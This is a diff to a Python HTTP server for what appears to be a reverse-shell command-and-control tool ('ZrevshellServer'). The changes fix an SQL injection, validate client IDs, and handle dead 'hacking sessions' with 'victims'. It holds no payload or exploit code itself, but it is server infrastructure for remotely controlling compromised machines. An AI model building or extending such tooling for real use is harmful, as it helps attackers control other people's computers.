@@ -84,7 +84,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         # If the client_id header doesn't exist then we tell the user
         # that he is sending a bad request
-        if client_id is None:
+        if client_id is None or client_id.strip() == "":
             self.c_send_error(HTTPStatus.BAD_REQUEST)
             return False
 
@@ -112,7 +112,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         has verified itself."""
         # query data from the database
         usr_client_type = self.database.query(
-            f"SELECT client_type FROM clients WHERE client_id='{client_id}'"
+            "SELECT client_type FROM clients WHERE client_id=?", [client_id]
         )
         # Let's return None if the client is not find in the database or an error occurred
         if usr_client_type is None or len(usr_client_type) == 0:
@@ -202,7 +202,8 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
     def validate_session(self, client_id: str, requested_session: str):
         """Validate the requested session with the session_id the client is actually in.
-        Returns a boolean a success and failure."""
+        Returns a boolean a success and failure. It will return None if the session is dead.
+        """
 
         # Very simple we'll check one condition that's
         # if the requested_session_id and the real_session_id match
@@ -271,8 +272,6 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         # in other session using commands
         session_id = req_body
 
-        # ! This is not complete yet.
-
         if session_id is None or session_id == "":
             return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
 
@@ -281,8 +280,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         if not is_valid_session:
             return sh.HandlerResponse(False, HTTPStatus.NOT_ACCEPTABLE)
 
-        # If it is a valid session now let's remove the session
-        # easily
+        # If it is a valid session now let's kill the session
         self.hacking_sessions.kill_session(session_id)
 
         # Respond to the client with an OK
@@ -291,7 +289,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
     def handle_cmd_register(
         self, client_id: str, client_type: int, req_body: str | None
     ):
-        """Do what needs to be done if the server command sent is 'verify'."""
+        """Do what needs to be done if the server command sent is 'register'."""
         # First let's check if the user is already in the database
         result = self.database.query(
             "SELECT * FROM clients WHERE client_id=?",
@@ -352,6 +350,11 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         # Session validation
         is_valid_session = self.validate_session(client_id, session_id)
+        if is_valid_session is None:
+            # That means the session is dead and we need to notify the victim
+            # that it is. .i.e send the termination response code and also remove the session.
+            self.hacking_sessions.remove_session(session_id)
+            return sh.HandlerResponse(False, HTTPStatus.GONE)
         if not is_valid_session:
             return sh.HandlerResponse(False, HTTPStatus.NOT_ACCEPTABLE)
 
@@ -428,6 +431,11 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         # Session validation
         is_valid_session = self.validate_session(client_id, session_id)
+        if is_valid_session is None:
+            # That means the session is dead and we need to notify the victim
+            # that it is. .i.e send the termination response code and remove the session
+            self.hacking_sessions.remove_session(session_id)
+            return sh.HandlerResponse(False, HTTPStatus.GONE)
         if not is_valid_session:
             return sh.HandlerResponse(False, HTTPStatus.NOT_ACCEPTABLE)
 
